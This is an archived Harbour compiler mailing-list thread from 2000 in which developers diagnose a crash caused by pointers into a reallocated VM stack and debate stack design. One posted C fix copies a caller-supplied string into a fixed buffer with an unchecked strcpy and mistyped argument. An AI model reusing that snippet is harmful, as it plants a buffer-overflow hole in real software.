Subject: [Harbour] 2000-11-04 14:45 UTC+0800 Ron Pinkas <ron@profit-master.com>

<PRE>2000-11-04 14:45 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;

   * include/hbexpra.c
   * source/pp/pptable.c
     ! Excluded Ryszard changes using #if[n]def SIMPLEX from SimpLex
version.
       Ryszard code remains intact for Flex version (including 3 reported
bugs).

   * hb_slex.bc
     + Added -DSIMPLEX when compiling:

         source/pp/pptable.c
         source/compiler/expropta.c
         source/macro/macroa.c

       /* This allow conditional exclusion of Ryszard changes for SimpLex
version. */

     /* Todo - have to do same in GNU make */



</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 18:09:01 2000
Date: Sat Nov  4 18:09:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Maurilio,

Great Job!!!

Ron

&gt;<i> Jean,
</I>&gt;<i> 
</I>&gt;<i> I think I've found the cause of exceptions.
</I>&gt;<i> 
</I>&gt;<i> during class creation this sequence (classes.1610..1613)
</I>&gt;<i> 
</I>&gt;<i> hb_vmPushSymbol( pDynSym-&gt;pSymbol );        /* Push function name      
</I>&gt;<i> */
</I>&gt;<i> hb_vmPushNil();
</I>&gt;<i> hb_vmFunction( 0 );                         /* Execute super class     
</I>&gt;<i> */
</I>&gt;<i> 
</I>&gt;<i> causes a stack growth. Harbour stack is realloc()ed so now it points
</I>&gt;<i> somewhere else inside
</I>&gt;<i> memory (realloc() return a different pointer if there is not enough
</I>&gt;<i> space to grow existing one) but local variable pString still point
</I>&gt;<i> inside &quot;old&quot; stack.
</I>&gt;<i> 
</I>&gt;<i> I'm able to &quot;fix&quot; my exception simply increasing STACK_INITHB_ITEMS to
</I>&gt;<i> 1000.
</I>&gt;<i> 
</I>&gt;<i> I think we need to change stack handling of harbour (or state it clear
</I>&gt;<i> that is not correct to have local variables pointing inside stack since
</I>&gt;<i> stack can change its position during runtime).
</I>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 18:14:02 2000
Date: Sat Nov  4 18:14:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Ryszard,

Just a note that I've tested contrib/dot/pp.prg after your fixes, and it
still exhibits the GPF I reported recently.

Ron

&gt;<i>     *include/hbapi.h
</I>&gt;<i>     *include/hbapiitm.h
</I>&gt;<i>         * added hb_itemIncRef/hb_itemDecRef declarations
</I>&gt;<i>         * added hb_codeblockIncRef/hb_codeblockDecRef
</I>
&gt;<i>     *source/vm/codebloc.c
</I>&gt;<i>     *source/vm/itemapi.c
</I>&gt;<i>     *source/vm/memvars.c
</I>&gt;<i>         * fixed reference counting for detached local variables
</I>&gt;<i>         (This should cure many random core dumps/GPFs)
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Sat Nov  4 20:56:01 2000
Date: Sat Nov  4 20:56:01 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Hi Jean,

I'll do this test tomorrow morning, but I have to say that I think
harbour stack management is &quot;broken by design&quot; :-|

It has no sense at all that a stack moves from address to address every
time it grows.

Stack management should be rewritten to avoid this (and is simple, you
only need to reserve a large enough address space, say 64Mb, that you
commit one piece after another when the need arises; this way stack
address does not &quot;move&quot; during program execution).

regards.

JF Lefebvre ha scritto:
&gt;<i> 
</I>&gt;<i> Maurilio,
</I>&gt;<i> 
</I>&gt;<i> Could you please do a check with the attached classes.c without
</I>&gt;<i> your stack modification. If it work, I will post it immediately and will
</I>&gt;<i> also read it carrefully to see if I can found any other 'hole' of the
</I>&gt;<i> same type.
</I>&gt;<i> 
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; &gt; I think I've found the cause of exceptions.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; during class creation this sequence (classes.1610..1613)
</I>&gt;<i> &gt; &gt; ...
</I>&gt;<i> &gt; &gt; causes a stack growth. Harbour stack is realloc()ed so now it points
</I>&gt;<i> &gt; &gt; somewhere else inside memory
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Yes, well seen... Really.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; &gt;...
</I>&gt;<i> &gt; &gt; I think we need to change stack handling of harbour (or state it clear
</I>&gt;<i> &gt; &gt; that is not correct to have local variables pointing inside stack since
</I>&gt;<i> &gt; &gt; stack can change its position during runtime).
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; In fact I think I should had used a copy of pstring instead of
</I>&gt;<i> &gt; directly working on the pointer. I even tend to thing it's the same
</I>&gt;<i> &gt; with cl*pper. Reading most of my C extend code I see I always
</I>&gt;<i> &gt; copy first all string pointer before use it.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; I will do a re-read of classes.c with this in mind. After that I will post
</I>&gt;<i> &gt; the modif. It could be interesting to retry it after that.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Best regards,
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; J. Lefebvre,
</I>&gt;<i> &gt; Bruxelles,
</I>&gt;<i> &gt; Belgium
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; _______________________________________________
</I>&gt;<i> &gt; Harbour mailing list
</I>&gt;<i> &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> 
</I>&gt;<i> Best regards,
</I>&gt;<i> 
</I>&gt;<i> J. Lefebvre,
</I>&gt;<i> Bruxelles,
</I>&gt;<i> Belgium
</I>&gt;<i> 
</I>&gt;<i>   ------------------------------------------------------------------------
</I>&gt;<i> The following section of this message contains a file attachment
</I>&gt;<i> prepared for transmission using the Internet MIME message format.
</I>&gt;<i> If you are using Pegasus Mail, or any another MIME-compliant system,
</I>&gt;<i> you should be able to save it or view it from within your mailer.
</I>&gt;<i> If you cannot, please ask your system administrator for assistance.
</I>&gt;<i> 
</I>&gt;<i>    ---- File information -----------
</I>&gt;<i>      File:  classes.c
</I>&gt;<i>      Date:  4 Nov 2000, 22:33
</I>&gt;<i>      Size:  68410 bytes.
</I>&gt;<i>      Type:  Program-source
</I>&gt;<i> 
</I>&gt;<i>   ------------------------------------------------------------------------
</I>&gt;<i>                 Name: classes.c
</I>&gt;<i>    classes.c    Type: tipo non specificato (Application/Octet-stream)
</I>&gt;<i>             Encoding: BASE64
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 04:00:03 2000
Date: Sun Nov  5 04:00:03 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-05 10:00 UTC+0100 JFL (mafact) <jfl@mafact.com>

<PRE>2000-11-05 10:00 UTC+0100 JFL (mafact) &lt;<A HREF="mailto:jfl@mafact.com">jfl@mafact.com</A>&gt;
   * source/vm/classes.c
     * work around due to the fact HB stack can move
       from address to address when stack growth.
       __clsinstsuper() caused GPF


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 05:01:01 2000
Date: Sun Nov  5 05:01:01 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Jean,

I can confirm that your new classes.c works ok without changes to hvm.c.

regards.

Maurilio Longo ha scritto:
&gt;<i> 
</I>&gt;<i> Hi Jean,
</I>&gt;<i> 
</I>&gt;<i> I'll do this test tomorrow morning, but I have to say that I think
</I>&gt;<i> harbour stack management is &quot;broken by design&quot; :-|
</I>&gt;<i> 
</I>&gt;<i> It has no sense at all that a stack moves from address to address every
</I>&gt;<i> time it grows.
</I>&gt;<i> 
</I>&gt;<i> Stack management should be rewritten to avoid this (and is simple, you
</I>&gt;<i> only need to reserve a large enough address space, say 64Mb, that you
</I>&gt;<i> commit one piece after another when the need arises; this way stack
</I>&gt;<i> address does not &quot;move&quot; during program execution).
</I>&gt;<i> 
</I>&gt;<i> regards.
</I>&gt;<i> 
</I>&gt;<i> JF Lefebvre ha scritto:
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Maurilio,
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Could you please do a check with the attached classes.c without
</I>&gt;<i> &gt; your stack modification. If it work, I will post it immediately and will
</I>&gt;<i> &gt; also read it carrefully to see if I can found any other 'hole' of the
</I>&gt;<i> &gt; same type.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; I think I've found the cause of exceptions.
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; during class creation this sequence (classes.1610..1613)
</I>&gt;<i> &gt; &gt; &gt; ...
</I>&gt;<i> &gt; &gt; &gt; causes a stack growth. Harbour stack is realloc()ed so now it points
</I>&gt;<i> &gt; &gt; &gt; somewhere else inside memory
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Yes, well seen... Really.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt;...
</I>&gt;<i> &gt; &gt; &gt; I think we need to change stack handling of harbour (or state it clear
</I>&gt;<i> &gt; &gt; &gt; that is not correct to have local variables pointing inside stack since
</I>&gt;<i> &gt; &gt; &gt; stack can change its position during runtime).
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; In fact I think I should had used a copy of pstring instead of
</I>&gt;<i> &gt; &gt; directly working on the pointer. I even tend to thing it's the same
</I>&gt;<i> &gt; &gt; with cl*pper. Reading most of my C extend code I see I always
</I>&gt;<i> &gt; &gt; copy first all string pointer before use it.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; I will do a re-read of classes.c with this in mind. After that I will post
</I>&gt;<i> &gt; &gt; the modif. It could be interesting to retry it after that.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Best regards,
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; J. Lefebvre,
</I>&gt;<i> &gt; &gt; Bruxelles,
</I>&gt;<i> &gt; &gt; Belgium
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; _______________________________________________
</I>&gt;<i> &gt; &gt; Harbour mailing list
</I>&gt;<i> &gt; &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Best regards,
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; J. Lefebvre,
</I>&gt;<i> &gt; Bruxelles,
</I>&gt;<i> &gt; Belgium
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;   ------------------------------------------------------------------------
</I>&gt;<i> &gt; The following section of this message contains a file attachment
</I>&gt;<i> &gt; prepared for transmission using the Internet MIME message format.
</I>&gt;<i> &gt; If you are using Pegasus Mail, or any another MIME-compliant system,
</I>&gt;<i> &gt; you should be able to save it or view it from within your mailer.
</I>&gt;<i> &gt; If you cannot, please ask your system administrator for assistance.
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;    ---- File information -----------
</I>&gt;<i> &gt;      File:  classes.c
</I>&gt;<i> &gt;      Date:  4 Nov 2000, 22:33
</I>&gt;<i> &gt;      Size:  68410 bytes.
</I>&gt;<i> &gt;      Type:  Program-source
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;   ------------------------------------------------------------------------
</I>&gt;<i> &gt;                 Name: classes.c
</I>&gt;<i> &gt;    classes.c    Type: tipo non specificato (Application/Octet-stream)
</I>&gt;<i> &gt;             Encoding: BASE64
</I>&gt;<i> 
</I>&gt;<i> --
</I>&gt;<i> 
</I>&gt;<i>  __________
</I>&gt;<i> |  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A>
</I>&gt;<i> |_|_|_|____| Team OS/2 Italia
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 05:06:02 2000
Date: Sun Nov  5 05:06:02 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Maurilio,

&gt;<i> Stack management should be rewritten to avoid this (and is simple, you
</I>&gt;<i> only need to reserve a large enough address space, say 64Mb, that you
</I>&gt;<i> commit one piece after another when the need arises; this way stack
</I>&gt;<i> address does not &quot;move&quot; during program execution).
</I>
I don't agree with you. We have been suffering for years Clipper
stack limitations, so when we originally designed Harbour we all
decided to implement a dynamic stack, a stack that may grow or
shrink upon application requirements.

Harbour must have a dynamic stack. If the actual one has bugs, 
lets then fix them, but lets keep the actual implementation.

Antonio

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 05:08:03 2000
Date: Sun Nov  5 05:08:03 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-05 10:00 UTC+0100 JFL (mafact) <jfl@mafact.com>

<PRE>JF,

&gt;<i>      * work around due to the fact HB stack can move
</I>&gt;<i>        from address to address when stack growth.
</I>&gt;<i>        __clsinstsuper() caused GPF
</I>
The way to avoid these kind of errors (we suffered them
when we started building Harbour) is not to use addresses
but to use the amount of stack items between two stack
positions.

i.e.:

    actual stack base address + &lt;n&gt; stack items

Antonio

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 05:14:02 2000
Date: Sun Nov  5 05:14:02 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Antonio,

it would be dynamic. StackInit() reserves an uncommitted memory address
range (say 64Mb). This is only an address range, there is no real memory
used.

Any time you need to increase your stack you commit a piece of this
address range, that is you request to your operating system a piece of
real memory to back up a &quot;piece&quot; of that address range.

Your stack will be dynamic but won't &quot;move&quot; inside you address space.

The only drawback of this idea is that dos doesn't have such
possibilities.

regards.

Antonio Linares ha scritto:
&gt;<i> 
</I>&gt;<i> Maurilio,
</I>&gt;<i> 
</I>&gt;<i> &gt; Stack management should be rewritten to avoid this (and is simple, you
</I>&gt;<i> &gt; only need to reserve a large enough address space, say 64Mb, that you
</I>&gt;<i> &gt; commit one piece after another when the need arises; this way stack
</I>&gt;<i> &gt; address does not &quot;move&quot; during program execution).
</I>&gt;<i> 
</I>&gt;<i> I don't agree with you. We have been suffering for years Clipper
</I>&gt;<i> stack limitations, so when we originally designed Harbour we all
</I>&gt;<i> decided to implement a dynamic stack, a stack that may grow or
</I>&gt;<i> shrink upon application requirements.
</I>&gt;<i> 
</I>&gt;<i> Harbour must have a dynamic stack. If the actual one has bugs,
</I>&gt;<i> lets then fix them, but lets keep the actual implementation.
</I>&gt;<i> 
</I>&gt;<i> Antonio
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 

 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 06:05:04 2000
Date: Sun Nov  5 06:05:04 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Maurilio,

&gt;<i> Any time you need to increase your stack you commit a piece of this
</I>&gt;<i> address range
</I>
Yes, but what happens when 64Ks (i.e.) are already used and more is
required ?

A dynamic stack is the way to go.


Antonio


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 06:11:01 2000
Date: Sun Nov  5 06:11:01 2000
From: Antonio Linares harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Maurilio,

&gt;<i> A dynamic stack is the way to go.
</I>
In fact, all Harbour subsystems are adapted to manage
Harbour dynamic stack.

What you have discovered (excelllent!!!) is a classes.c bug, 
not a Harbour stack bug. 

So, there is no need to change Harbour stack implementation,
only classes.c.


Antonio

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 06:42:02 2000
Date: Sun Nov  5 06:42:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>thanks Maurilio

I had the feeling of that (thanks to you :-) , so It's already cvsed.

&gt;<i> Jean,
</I>&gt;<i> 
</I>&gt;<i> I can confirm that your new classes.c works ok without changes to hvm.c.
</I>&gt;<i> 
</I>&gt;<i> regards.
</I>&gt;<i> 
</I>&gt;<i> Maurilio Longo ha scritto:
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; Hi Jean,
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; I'll do this test tomorrow morning, but I have to say that I think
</I>&gt;<i> &gt; harbour stack management is &quot;broken by design&quot; :-|
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; It has no sense at all that a stack moves from address to address every
</I>&gt;<i> &gt; time it grows.
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; Stack management should be rewritten to avoid this (and is simple, you
</I>&gt;<i> &gt; only need to reserve a large enough address space, say 64Mb, that you
</I>&gt;<i> &gt; commit one piece after another when the need arises; this way stack
</I>&gt;<i> &gt; address does not &quot;move&quot; during program execution).
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; regards.
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; JF Lefebvre ha scritto:
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Maurilio,
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Could you please do a check with the attached classes.c without
</I>&gt;<i> &gt; &gt; your stack modification. If it work, I will post it immediately and
</I>&gt;<i> &gt; &gt; will also read it carrefully to see if I can found any other 'hole' of
</I>&gt;<i> &gt; &gt; the same type.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; &gt; I think I've found the cause of exceptions.
</I>&gt;<i> &gt; &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; &gt; during class creation this sequence (classes.1610..1613)
</I>&gt;<i> &gt; &gt; &gt; &gt; ...
</I>&gt;<i> &gt; &gt; &gt; &gt; causes a stack growth. Harbour stack is realloc()ed so now it
</I>&gt;<i> &gt; &gt; &gt; &gt; points somewhere else inside memory
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; Yes, well seen... Really.
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; &gt;...
</I>&gt;<i> &gt; &gt; &gt; &gt; I think we need to change stack handling of harbour (or state it
</I>&gt;<i> &gt; &gt; &gt; &gt; clear that is not correct to have local variables pointing inside
</I>&gt;<i> &gt; &gt; &gt; &gt; stack since stack can change its position during runtime).
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; In fact I think I should had used a copy of pstring instead of
</I>&gt;<i> &gt; &gt; &gt; directly working on the pointer. I even tend to thing it's the same
</I>&gt;<i> &gt; &gt; &gt; with cl*pper. Reading most of my C extend code I see I always copy
</I>&gt;<i> &gt; &gt; &gt; first all string pointer before use it.
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; I will do a re-read of classes.c with this in mind. After that I
</I>&gt;<i> &gt; &gt; &gt; will post the modif. It could be interesting to retry it after that.
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; Best regards,
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; J. Lefebvre,
</I>&gt;<i> &gt; &gt; &gt; Bruxelles,
</I>&gt;<i> &gt; &gt; &gt; Belgium
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; _______________________________________________
</I>&gt;<i> &gt; &gt; &gt; Harbour mailing list
</I>&gt;<i> &gt; &gt; &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; &gt; &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt; Thank you for participating in The Harbour Project.  Be sure to
</I>&gt;<i> &gt; &gt; &gt; check <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt; &gt;
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; Best regards,
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt; J. Lefebvre,
</I>&gt;<i> &gt; &gt; Bruxelles,
</I>&gt;<i> &gt; &gt; Belgium
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt;   --------------------------------------------------------------------
</I>&gt;<i> &gt; &gt;   ----
</I>&gt;<i> &gt; &gt; The following section of this message contains a file attachment
</I>&gt;<i> &gt; &gt; prepared for transmission using the Internet MIME message format. If
</I>&gt;<i> &gt; &gt; you are using Pegasus Mail, or any another MIME-compliant system, you
</I>&gt;<i> &gt; &gt; should be able to save it or view it from within your mailer. If you
</I>&gt;<i> &gt; &gt; cannot, please ask your system administrator for assistance.
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt;    ---- File information -----------
</I>&gt;<i> &gt; &gt;      File:  classes.c
</I>&gt;<i> &gt; &gt;      Date:  4 Nov 2000, 22:33
</I>&gt;<i> &gt; &gt;      Size:  68410 bytes.
</I>&gt;<i> &gt; &gt;      Type:  Program-source
</I>&gt;<i> &gt; &gt;
</I>&gt;<i> &gt; &gt;   --------------------------------------------------------------------
</I>&gt;<i> &gt; &gt;   ----
</I>&gt;<i> &gt; &gt;                 Name: classes.c
</I>&gt;<i> &gt; &gt;    classes.c    Type: tipo non specificato (Application/Octet-stream)
</I>&gt;<i> &gt; &gt;             Encoding: BASE64
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; --
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt;  __________
</I>&gt;<i> &gt; |  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A>
</I>&gt;<i> &gt; |_|_|_|____| Team OS/2 Italia
</I>&gt;<i> &gt; _______________________________________________
</I>&gt;<i> &gt; Harbour mailing list
</I>&gt;<i> &gt; <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> &gt; <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> &gt; 
</I>&gt;<i> &gt; Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> &gt; <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> -- 
</I>&gt;<i> 
</I>&gt;<i>  __________                   
</I>&gt;<i> |  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>&gt;<i> |_|_|_|____| Team OS/2 Italia
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i> 
</I>&gt;<i> 
</I>


Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 06:52:02 2000
Date: Sun Nov  5 06:52:02 2000
From: JF Lefebvre harbour@lists.harbour-project.org
Subject: [Harbour] Antonio ... stack base address + <n> stack items

<PRE>Hi Antonio

&gt;<i> ...
</I>&gt;<i> The way to avoid these kind of errors (we suffered them
</I>&gt;<i> when we started building Harbour) is not to use addresses
</I>&gt;<i> but to use the amount of stack items between two stack
</I>&gt;<i> positions.
</I>&gt;<i> 
</I>&gt;<i> i.e.:
</I>&gt;<i> 
</I>&gt;<i>     actual stack base address + &lt;n&gt; stack items
</I>&gt;<i> 
</I>
Could you please just develop a bit this technic against the specific 
case here (the one wich caused a GPF), or point me where I could 
read info about the use of stack in place of hb_param() to be sure 
to have valid ref. during the work. There is a least three other 
function wich could cause similar problem I think.

Now in place of directly use the HB_ITEM pointer, I do a copy of 
the string param and then do the work.

HB_FUNC( __CLSINSTSUPER )
{
   char cString[ HB_SYMBOL_NAME_LEN + 1 ] ;
   /*PHB_ITEM pString = hb_param( 1, HB_IT_STRING ); */
   BOOL bFound = FALSE;

   strcpy( &amp;cString, hb_parc(1) );

   if( /*pString*/ hb_pcount() &gt;= 1 )
   { ...



Best regards,

J. Lefebvre,
Bruxelles,
Belgium


</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 10:45:04 2000
Date: Sun Nov  5 10:45:04 2000
From: Brian Hays harbour@lists.harbour-project.org
Subject: [Harbour] 2000-11-05 10:00 UTC+0100 JFL (mafact) <jfl@mafact.com>

<PRE>Antonio:

Are these kinds of guidelines written down anywhere so those who weren't
around in the &quot;good old days&quot; can try to be aware of them?  If not, I can
try to compile a list with help from those who know (perhaps in codestyl.txt
?)


Brian Hays
Abacus Data Systems, Inc



&gt;<i> JF,
</I>&gt;<i>
</I>&gt;<i> &gt;      * work around due to the fact HB stack can move
</I>&gt;<i> &gt;        from address to address when stack growth.
</I>&gt;<i> &gt;        __clsinstsuper() caused GPF
</I>&gt;<i>
</I>&gt;<i> The way to avoid these kind of errors (we suffered them
</I>&gt;<i> when we started building Harbour) is not to use addresses
</I>&gt;<i> but to use the amount of stack items between two stack
</I>&gt;<i> positions.
</I>&gt;<i>
</I>&gt;<i> i.e.:
</I>&gt;<i>
</I>&gt;<i>     actual stack base address + &lt;n&gt; stack items
</I>&gt;<i>
</I>&gt;<i> Antonio
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i>
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>&gt;<i>
</I>

</PRE>

From harbour@lists.harbour-project.org  Sun Nov  5 11:17:01 2000
Date: Sun Nov  5 11:17:01 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] Re : dynsym.c caused GPF

<PRE>Antonio,

if you need more than 64Mb (Mb not Kb) per thread of stack space your
algorithm is surely broken :-)))

And note that present stack growing code DOES NOT check if realloc() is
succesfull or not.

regards.

Antonio Linares ha scritto:
&gt;<i> 
</I>&gt;<i> Maurilio,
</I>&gt;<i> 
</I>&gt;<i> &gt; Any time you need to increase your stack you commit a piece of this
</I>&gt;<i> &gt; address range
</I>&gt;<i> 
</I>&gt;<i> Yes, but what happens when 64Ks (i.e.) are already used and more is
</I>&gt;<i> required ?
</I>&gt;<i> 
</I>&gt;<i> A dynamic stack is the way to go.
</I>&gt;<i> 
</I>&gt;<i> Antonio
</I>&gt;<i> 
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
